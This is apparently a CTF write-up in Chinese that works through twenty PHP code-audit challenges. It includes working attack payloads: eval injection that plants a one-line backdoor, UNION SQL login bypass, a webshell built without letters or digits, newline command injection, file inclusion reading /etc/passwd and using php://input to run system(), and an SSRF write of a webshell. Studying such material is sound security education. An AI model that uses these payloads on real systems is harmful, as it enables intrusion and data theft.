---
title: PHP_Code_challenge(代码审计)
date: 2020-04-20 23:40:35
updated: 2020-04-20 23:40:35
categories:
---

PHP_Code_challenge(代码审计) write up<!--more-->

# challenge 1

**源码**

```php
1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY=
<?php

error_reporting(0);
require __DIR__.'/lib.php';

echo base64_encode(hex2bin(strrev(bin2hex($flag)))), '<hr>';

highlight_file(__FILE__);
```



python脚本

```python
import base64
import binascii
def strrev(string):
    return string[::-1]
a="1wMDEyY2U2YTY0M2NgMTEyZDQyMjAzNWczYjZgMWI4NTt3YWxmY="
b=binascii.a2b_hex(strrev(binascii.b2a_hex(base64.b64decode(a))))
print (b)
```



> binascii模块用来进行进制和字符串之间的转换
> base64模块是用来作base64编码解码
> [::-1]取反，这里-1为步长





# challenge 2

**源码**

```php
 <?php
error_reporting(0);
require __DIR__.'/lib.php';
if(isset($_GET['time'])){
    if(!is_numeric($_GET['time'])){
        echo 'The time must be number.';
    }else if($_GET['time'] < 60 * 60 * 24 * 30 * 2){
        echo 'This time is too short.';
    }else if($_GET['time'] > 60 * 60 * 24 * 30 * 3){
        echo 'This time is too long.';
    }else{
        sleep((int)$_GET['time']);
        echo $flag;
    }
    echo '<hr>';
}
highlight_file(__FILE__); 
```



> sleep() 函数用来推迟调用线程的运行
> (int)强转换，可以用科学记数法绕过



# challenge 3

**源码**

```php
<?php
error_reporting(0);
echo "<!--challenge3.txt-->";
require __DIR__.'/lib.php';
if(!$_GET['id'])
{
    header('Location: challenge3.php?id=1');
    exit();
}
$id=$_GET['id'];
$a=$_GET['a'];
$b=$_GET['b'];
if(stripos($a,'.'))
{
    echo 'Hahahahahaha';
    return ;
}
$data = @file_get_contents($a,'r');
if($data=="1112 is a nice lab!" and $id==0 and strlen($b)>5 and eregi("111".substr($b,0,1),"1114") and substr($b,0,1)!=4)
{
    echo $flag;
}
else
{
    print "work harder!harder!harder!";
}
?>
```

a-->

 ①不存在'.'号或'.'号再开头；

 ②`$data = @file_get_contents($a,'r');`把a写入字符串中要为1112 is a nice lab!

b-->

①长度大于五

②截取b的第一位和111拼接能和1114匹配

③b的第一位不为4

id-->

①不为0或NULL（不为空）

②弱等于0



> a:   $a=php://input;     post:1112 is a nice lab!
> b:   %00截断，%00截断对substr有效，对strlen无效（即%00不会对strlen截断）
> php弱类型比较，数字与字符串等值比较时，字符串取开头的有效数字，无则为0





# challenge 4

**源码**

```php
<?php 
error_reporting(0);
show_source(__FILE__);

$a = @$_REQUEST['hello'];
eval("var_dump($a);"); 
```



> 构造一句话木马   `?hello=);eval($_POST[value]);%23`
> 当var_dump($a);后的结果为：`string(22) ");eval($_POST[value]);#"`
> `eval("string(23) ");eval($_POST[value]);//"");`

> PHP对于双引号包裹起来的字符串要进行扫描计算，单引号则不管内容如何都会原样输出而不会进行计算。



# challenge 5

**源码**

```php
<?php
if (isset($_GET['name']) and isset($_GET['password'])) {
    if ($_GET['name'] == $_GET['password'])
        echo '<p>Your password can not be your name!</p>';
    else if (sha1($_GET['name']) === sha1($_GET['password']))
      die('Flag: '.$flag);
    else
        echo '<p>Invalid password.</p>';
}
else{
	echo '<p>Login first!</p>';
?>
```



> sha1无法处理数组，因此可构造数组绕过,数组传入结果为NULL





# challenge 6

**源码**

```php
<?php
if($_POST[user] && $_POST[pass]) {
	$conn = mysql_connect("********", "*****", "********");
	mysql_select_db("challenges") or die("Could not select database");
	if ($conn->connect_error) {
		die("Connection failed: " . mysql_error($conn));
}
$user = $_POST[user];
$pass = md5($_POST[pass]);
$sql = "select pwd from interest where uname='$user'";
$query = mysql_query($sql);
if (!$query) {
	printf("Error: %s\n", mysql_error($conn));
	exit();
}
$row = mysql_fetch_array($query, MYSQL_ASSOC);
//echo $row["pwd"];
  if (($row[pwd]) && (!strcasecmp($pass, $row[pwd]))) {
	echo "<p>Logged in! Key:************** </p>";
}
else {
    echo("<p>Log in failure!</p>");
  }
}
?>
```



> 联合查询注入漏洞,构造 username=-1'union select"md5(123)"#&pass=123



# challenge 7

**源码**

```php
<?php
include "flag.php";
$_403 = "Access Denied";
$_200 = "Welcome Admin";
if ($_SERVER["REQUEST_METHOD"] != "POST")  # 要为POST
     die("BugsBunnyCTF is here :p...");
if ( !isset($_POST["flag"]) )
    die($_403);
foreach ($_GET as $key => $value)
    $$key = $$value;
foreach ($_POST as $key => $value)
    $$key = $value;
if ( $_POST["flag"] !== $flag )
    die($_403);
echo "This is your flag : ". $flag . "\n";
die($_200);

```



> 可在flag被修改之前，先将flag覆盖 
> 程序执行顺序foreach ($_GET as $key => $value) 比  foreach ($_POST as $key => $value)先执行，因此可利用foreach ($_GET as $key => $value) 将flag覆盖

> $$key = $$value 看到这个，想到变量覆盖



# challenge 8

**源码**

```php
<?php
ini_set("display_errors", "On");
error_reporting(E_ALL | E_STRICT);
if(!isset($_GET['c'])){
    show_source(__FILE__);
    die();
#需要GET一个变量c
}
function rand_string( $length ) {
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
    $size = strlen( $chars );
    $str = '';
    for( $i = 0; $i < $length; $i++)
   {
       $str .= $chars[ rand( 0, $size - 1 ) ];
   }
    return $str;
}
#生成$length长度的随机字符串
$data = $_GET['c'];
$black_list = array(' ', '!', '"', '#', '%', '&', '*', ',', '-', '/', '0', '1', '2', '3', '4', '5', '6', '7', '8', '9', ':', '<', '>', '?', '@', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z', '\\', '^', '`', 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z', '|', '~');
foreach ($black_list as $b) {
    if (stripos($data, $b) !== false){
        die("WAF!");
    }
}
#变量c不能含有$black_list数组中的元素
$filename=rand_string(0x20).'.php';
$folder='uploads/';
$full_filename = $folder.$filename;
if(file_put_contents($full_filename, '<?php '.$data)){
    echo "<a href='".$full_filename."'>WebShell</a></br>";
    echo "Enjoy your webshell~";
}else{
    echo "Some thing wrong...";
}
?>
```





> 这题考察的是构造无字母数字Webshell，有点晕，附文章先学习一波
>
> https://www.cnblogs.com/ECJTUACM-873284962/p/9433641.html
>
> https://www.leavesongs.com/PENETRATION/webshell-without-alphanum.html
>
> https://www.freebuf.com/articles/web/186298.html

> 在PHP中，如果强制连接数组和字符串的话，数组将被转换成字符串，其值为`Array`
> system()—执行shell命令也就是向dos发送一条指令
> cat命令可以用来查看文件内容
> <?php  $a=array(); echo $a;?> #Array
> <?php  $a=array(); $b=array(); echo $a.$b;?>  #ArrayArray
> <?php  $a=array(); $b="asd"; echo $a.$b;?>  #Arrayasd



```php
<?php
$_=[].[];
$__='';
$_=$_[''];
$_=++$_;$_=++$_;$_=++$_;$_=++$_;
$__.=$_; // E
$_=++$_;$_=++$_;
$__=$_.$__; // GE
$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;$_=++$_;
$_=++$_;$_=++$_;$_=++$_;
$__.=$_; // GET
var_dump(${'_'.$__}[_](${'_'.$__}[__])); // $_GET['_']($_GET['__']);

```

```
c=%24_%3d%5b%5d.%5b%5d%3b%24__%3d%27%27%3b%24_%3d%24_%5b%27%27%5d%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__%3d%24_.%24__%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24_%3d%2b%2b%24_%3b%24__.%3d%24_%3b%24%7b%27_%27.%24__%7d%5b_%5d(%24%7b%27_%27.%24__%7d%5b__%5d)%3b
```

写入full_filename，成功上传webshell，命令执行`?_=system&__=cat%20../flag.php`

即`system(cat%20../flag.php)`





# challenge 9

**源码**

```php
<?php
if(isset($_REQUEST[ 'ip' ])) {
    $target = trim($_REQUEST[ 'ip' ]);
    $substitutions = array(
        '&'  => '',
        ';'  => '',
        '|' => '',
        '-'  => '',
        '$'  => '',
        '('  => '',
        ')'  => '',
        '`'  => '',
        '||' => '',
    );
    $target = str_replace( array_keys( $substitutions ), $substitutions, $target );
    $cmd = shell_exec( 'ping  -c 4 ' . $target );
        echo $target;
    echo  "<pre>{$cmd}</pre>";
}
show_source(__FILE__);
```

可以看到基本上的命令分隔符都被过滤了，可以可以换行（%0a）绕过

> 多条命令设置在同一个快捷键时，需要注意命令分隔符的使用
>
> ```
> $cmd = shell_exec( 'ping  -c 4 ' . $target );
> Payload: ?ip=127.0.0.1%0als
> ```
>
> cat命令可以用来查看文件内容`?ip=127.0.0.1%0acat flag.php`
>
> trim() 函数移除字符串两侧的空白字符或其他预定义字符。

命令分隔符

> linux中：%0a 、%0d 、; 、& 、| 、&&、||
> windows中：%0a、&、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）

空格可以用以下字符串代替

> < 、<>、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等





# challenge 10

**源码**

```php
<?php 
require __DIR__.'/flag.php';
if (isset($_POST['answer'])){ 
    $number = $_POST['answer']; 
    if (noother_says_correct($number)){ 
        echo $flag; 
    }  else { 
        echo "Sorry"; 
    } 
} 

function noother_says_correct($number) 
{ 
    $one = ord('1');  #ord() 函数:返回字符串的首个字符的 ASCII 值
    $nine = ord('9'); 
    # Check all the input characters! 
    for ($i = 0; $i < strlen($number); $i++) 
    { 
        # Disallow all the digits! 
        $digit = ord($number{$i}); 
        if ( ($digit >= $one) && ($digit <= $nine) ) 
        { 
            # Aha, digit not allowed! 
            return false; 
        } 
        #要求传入的每一个值都不能大于等于1小于等于9
    } 
    # Allow the magic number ... 
    return $number == "3735929054"; #弱类型比较
} 

highlight_file(__FILE__);
?>
```

需要POST一个不含1-9数字的，且与`3735929054`等值的字符串

> 十六进制弱类型比较
>
> 十六进制：(0x)deadc0de
>
> 八进制：0+





# challenge 11

**源码**

```php
<?php
include "flag.php";
$a = @$_REQUEST['hello'];
if(!preg_match('/^\w*$/',$a )){
  die('ERROR');
}# 输入的必须为数字或字母
eval("var_dump($$a);");
show_source(__FILE__);
?>
```

> var_dump($$a)中存在$$a，可以输出对应的变量值,即flag,但前提是需要知道flag的变量名，可利用$GLOBALS，https://www.cnblogs.com/NPFS/p/12721175.html





# challenge 12

**源码**

```php
<?php
include "flag.php";
$a = @$_REQUEST['hello'];
eval( "var_dump($a);");
show_source(__FILE__);
```

做法类似challenge 4

> var_dump($a)可考虑命令执行，构造`?hello=);var_dump(file("flag.php"));//`
> var_dump($a); ---->` var_dump();var_dump(file("flag.php"));//);`





# challenge 13

**源码**

```php
<?php 
error_reporting(0);
session_start();
require('./flag.php');
if(!isset($_SESSION['nums'])){
  $_SESSION['nums'] = 0;
  $_SESSION['time'] = time();
  $_SESSION['whoami'] = 'ea';
}

if($_SESSION['time']+120<time()){
  session_destroy();
}  //120秒之后销毁会话

$value = $_REQUEST['value'];
$str_rand = range('a', 'z');  //range创建一个包含从 "a" 到 "z" 之间的元素范围的数组
$str_rands = $str_rand[mt_rand(0,25)].$str_rand[mt_rand(0,25)]; //生成两个随机字母

if($_SESSION['whoami']==($value[0].$value[1]) && substr(md5($value),5,4)==0){
  $_SESSION['nums']++;
  $_SESSION['whoami'] = $str_rands;
  echo $str_rands;
} //当whoami=value时，num+1，whoami=$str_rands；==弱类型比较

if($_SESSION['nums']>=10){
  echo $flag;
}  //循环10次输出flag

show_source(__FILE__);
?>
```

> 120秒直接手工传参，传十次就得到flag了
>
> 也可以写个脚本
>
> ```python
> import requests
> url='http://XXX'
> a=requests.Session()
> b=a.get(url+'?value[]=ea').text
> for i in range(10):
>     b=a.get(url+'?value[]='+ b[0:2]).text  //这里的b[0:2]是获取读取的源代码的前两个字符,因为手工传一次`?value[]=ea`后可以发现，新的随机数在源码最前面  
>     print(b)
> ```



# challenge 14

**源码**

```php
 <?php 
show_source(__FILE__);
if(isset($_REQUEST['path'])){
    include($_REQUEST['path']);
}else{
    include('phpinfo.php');
}
PHP logo
```

> 在linux文件/etc/passwd中包含用户名、用户[ID]、用户群组[ID]、用户描述信息、家目录以及登录shell
> ?path=../../../../etc/passwd
> allow_url_include打开着,使用php://input协议，post传递参数<?php system("ls");?>，可以发现flag.php
>
> 直接使用`php://filter/read=convert.base64-encode/resource=flag.php`读取文件内容
> 也可以继续使用php://input协议，post传递参数<?php system("cat flag.php");?>





# challenge 15

**源码**

```php
<?php
if(isset($_GET) && !empty($_GET)){        #存在GET且不为空
    $url = $_GET['file'];
    $path = 'upload/'.$_GET['path'];    #拼接路径
}else{
    show_source(__FILE__);
    exit();
}
 
if(strpos($path,'..') > -1){    # $path中不含..
    die('SYCwaf!');
}
 
if(strpos($url,'http://127.0.0.1/') === 0){          #$file变量中 http://127.0.0.1/ 存 在且为开头
    file_put_contents($path, file_get_contents($url));   #读取$url内容并写入$path
    echo "console.log($path update successed!)";   # 在控制台输出$path update successed!
}else{
    echo "Hello.Geeker";
}
```

我拿phpinfo做了下测试，之前以为

http://XXX/?path=shell.php&file=http://127.0.0.1/?path=<?php+phpinfo();?>&file=http://127.0.0.1/

里面的

file=http://127.0.0.1/?path=<?php+phpinfo();?>&file=http://127.0.0.1/（这里url需要二次编码，因为访问了两次）

写入到shell.php文件里面后就和题目的源码独立出来了，后来改改参数测试了下发现并没有，然后一切问题迎刃而解。



这个题目要的就是把shell.php构造为一个webshell，通过用URL请求这个webshell的页面并写入到path文件

URL二层嵌套，这两层都需要符合题目要求，即`$path中不含..  $file变量中 http://127.0.0.1/ 存在                                                       且为开头`所以很容易就可以构造出可以绕过的payload





# challenge 16

**源码**

```php
<?php  
if (isset($_POST["submit"]))    
{
  if (isset($_POST['hihi']))   # POST方式提交submit和hihi
  {
    if (ereg("^[a-zA-Z0-9]+$", $_POST['hihi']) === FALSE)  #hihi里只存在字母和数字
    {
      exit('<script>alert("have fun:)")</script>');
    }
    elseif (strlen($_POST['hihi']) < 11 && $_POST['hihi'] > 999999999) # hihi长度小   于11且数值大于999999999
    {
      if (strpos($_POST['hihi'], '#HONG#') !== FALSE)    #hihi中存在#HONG#
      {
        if (!is_array($_POST['hihi'])) {                  #hihi不为数组
        include("flag.php");
        echo "Congratulations! FLAG is : ".$flag;
        }
        else
      {
        exit('<script>alert("nonono")</script>');
      }
      }
      else
      {
        exit('<script>alert("nonono")</script>');
      }
    }
    else
    {
      exit('<script>alert("sorry")</script>');
    }
  }
}
show_source(__FILE__);
?>
```



```
submit=1&hihi=9e9%00#HONG#
```





# challenge 17

**源码**

```php
<?php
header("Content-type: text/html; charset=utf-8");
include('flag.php');
$smile = 1;
if (!isset ($_GET['^_^'])) $smile = 0;        # 存在^_^
if (ereg ('\.', $_GET['^_^'])) $smile = 0;     # 不存在\.
if (ereg ('%', $_GET['^_^'])) $smile = 0;         # 不存在%
if (ereg ('[0-9]', $_GET['^_^'])) $smile = 0;      # 不存在数字
if (ereg ('http', $_GET['^_^']) ) $smile = 0;      # 不存在http
if (ereg ('https', $_GET['^_^']) ) $smile = 0;     
if (ereg ('ftp', $_GET['^_^'])) $smile = 0;
if (ereg ('telnet', $_GET['^_^'])) $smile = 0;
if (ereg ('_', $_SERVER['QUERY_STRING'])) $smile = 0;  #url ?后面不存在_
if ($smile) {
    if (@file_exists ($_GET['^_^'])) $smile = 0;   # 不存在file_exists寻找的文件
}
if (1) {
    $smile = @file_get_contents ($_GET['^_^']);
    if ($smile === "(●'◡'●)") die($flag);
}
show_source(__FILE__);
?>
```



[$_SERVER['QUERY_STRING']](http://www.360doc.com/content/18/0203/09/52553745_727370869.shtml)

> 搜索引擎会忽略下划线的存在
> 当`.`或`[]`之类的符号作为参数的key的时候，会被PHP改写为`_`
> file_exists对data指向的内容判断为不存在
> $_SERVER['QUERY_STRING']：QUERY_STRING就是URL后接的参数，如www.baidu.com/?a=B，a=B就是QUERY_STRING
>
> "data"类型的Url格式，目的对于一些“小”的数据，可以在网页中直接嵌入，而不是从外部文件载入。



# challenge 18

**源码**

```php
<?php
header("Content-type: text/html; charset=utf-8"); 
    if(isset($_POST['login']))             #存在login
     {
        if(isset($_POST['user']))               #存在user
        {
            if(@strcmp($_POST['user'],$USER))//USER是被隐藏的复杂用户名     #比较大小
            {
                die('user错误！');
            }
        }
        if (isset($_POST['name']) && isset($_POST['password']))     #存在name和password
        {
            if ($_POST['name'] == $_POST['password'] )     #弱等于
            {
                die('账号密码不能一致！');
            }
            if (md5($_POST['name']) === md5($_POST['password']))     #md5强等于
            {
                if(is_numeric($_POST['id'])&&$_POST['id']!=='72' && !preg_match('/\s/', $_POST['id']))
                {
                        if($_POST['id']==72)
                            die("flag{xxxxxxxxxxxxx}");
                        else
                            die("ID错误2！");
                }
                else
                {
                    die("ID错误1！");
                }
            }
            else
                die('账号密码错误！');
        }
     }
 ?>
```



> `72.`     是数字字符串
> MD5不能处理数组，处理任意数组返回值都相同
> MD5每一个以0E开头的哈希值都解释为0
> strcmp函数用于比较两个字符串并根据比较结果返回整数,可改成数据类型绕过





# challenge 19

**源码**

```php
<?php
error_reporting(0);
require_once('flag.php');
if(!isset($_GET['sss'])){
    show_source('challenge19.php');
    die();
}
$sss=$_GET['sss'];
if(strlen($sss)==666){            #长度等于666
    if(!preg_match("/[^0-6]/",$sss)){     #只能存在0-6的数字 
        eval('$sss='.$sss.';');
        if($sss!=='0x666'){      #这里的0x是十六进制的意思
            if($sss=='0x666'){     # $sss 的值需要等于数值 0×666，而又不能等于字符串’0×666′，
                echo $flag;
            }
        }
    }
}
?>
```

需要创建一个长度为 666 ,只包含0 — 6的数字，数值上等于 0×666且不等于字符串 ’0×666′的参数,十六进制666转换可以发现八进制时在数字0-6之间

> 1、十六进制：0x开头
> 2、八进制：0开头
> 3、二进制：0b开头

# challenge 20

**源码**

```php
 <?php
require_once('flag.php');
if(empty($_GET['user']))
	die(show_source(__FILE__));
$user = ['admin', 'xxoo'];              #$user 是一个数组, [0 => ‘admin’, 1 => ‘xxoo’]
if($_GET['user'] === $user && $_GET['user'][0] != 'admin'){
    echo $flag;
}
?>
```



> ➜  ~  php -r "var_dump([1=>0]==[1=>0]);"
> bool(true)

> ➜  ~  php -r  "var_dump([1=>0]===[1=>0]);"
> bool(true)

> ➜  ~  php -r "var_dump([1=>0]==[2=>0]);"
> bool(false)

> ➜  ~  php -r "var_dump([1=>0]===[2=>0]);"
> bool(false)

> ➜  ~  php -r "var_dump([0 => 0] === [0x100000000 => 0]);"  #键名为 0 与0x100000000` 数组相等
> bool(true)